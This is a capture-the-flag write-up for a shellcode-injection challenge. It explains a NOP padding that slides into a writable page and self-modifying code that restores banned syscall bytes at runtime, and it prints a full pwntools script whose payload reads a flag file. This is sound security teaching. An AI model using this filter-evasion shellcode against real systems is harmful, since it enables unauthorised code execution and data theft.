# Challenge: Syscall Shenanigans (Shellcode Injection)
**Constraints**
Bad Characters: The input cannot contain syscall bytes (0x0f 0x05, sysenter, or int).
Memory Permissions: The challenge explicitly removes write permissions from the first 4096 bytes of the mapped shellcode memory.

**Analysis**
If we place our SMC shellcode at the beginning of the buffer (offset 0), the CPU will attempt to modify the instruction in memory. Since the page is marked Read-Only (RX), this triggers a Segmentation Fault (crash).

**Solution**
The challenge maps a total of 0x2000 bytes (8192 bytes) for the shellcode.

0x0000 - 0x0FFF (Page 1): Read-Only (RX). We cannot modify the code here.

0x1000 - 0x1FFF (Page 2): Read-Write-Execute (RWX). We can modify the code here.

We will pad the start of our payload with 4096 bytes of NOP (No Operation) instructions. This pushes our actual SMC payload into the second memory page. The CPU executes the NOPs in the Read-Only section (which is fine, as NOPs don't modify memory).

The CPU "slides" into the second page.

```
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# --- 1. The SMC Gadget ---
# We cannot write '\x0f\x05'.
# We write '\x0e\x05' and increment the first byte at runtime.
# \xfe\x05\x00\x00\x00\x00 -> inc byte ptr [rip]
smuggled_syscall = b"\xfe\x05\x00\x00\x00\x00" + b"\x0e\x05"

# --- 2. Construct the Logic (open / sendfile / exit) ---

# Step 1: open("/flag", O_RDONLY)
part1 = asm('''
    xor rax, rax
    push rax                 /* Null terminator */
    mov rbx, 0x67616c662f    /* "/flag" */
    push rbx
    mov rdi, rsp             /* Pointer to filename */
    xor rsi, rsi             /* O_RDONLY */
    mov rax, 2               /* SYS_open */
''')

# Step 2: sendfile(1, fd, 0, 1000)
part2 = asm('''
    mov rsi, rax             /* fd from open */
    mov rdi, 1               /* stdout */
    xor rdx, rdx             /* offset */
    mov r10, 1000            /* count */
    mov rax, 40              /* SYS_sendfile */
''')

# Step 3: exit(0)
part3 = asm('''
    mov rax, 60
    xor rdi, rdi
''')

# Combine the logic with the dynamic syscalls
shellcode = part1 + smuggled_syscall + part2 + smuggled_syscall + part3 + smuggled_syscall

# --- 3. The Bypass (Padding) ---
# The first 4096 bytes are Read-Only. We pad them with NOPs (0x90).
# This pushes our self-modifying code into the Writable memory region (4096+).
padding_size = 4096
padding = b'\x90' * padding_size

final_payload = padding + shellcode

# --- 4. Execution ---
# Sanity check
if b'\x0f\x05' in final_payload:
    log.error("Payload contains forbidden syscall bytes!")

# Save to file
with open('payload', 'wb') as f:
    f.write(final_payload)

log.success(f"Payload generated! Length: {len(final_payload)} bytes.")
log.info("Run with: cat payload | /challenge/syscall-shenanigans")
```
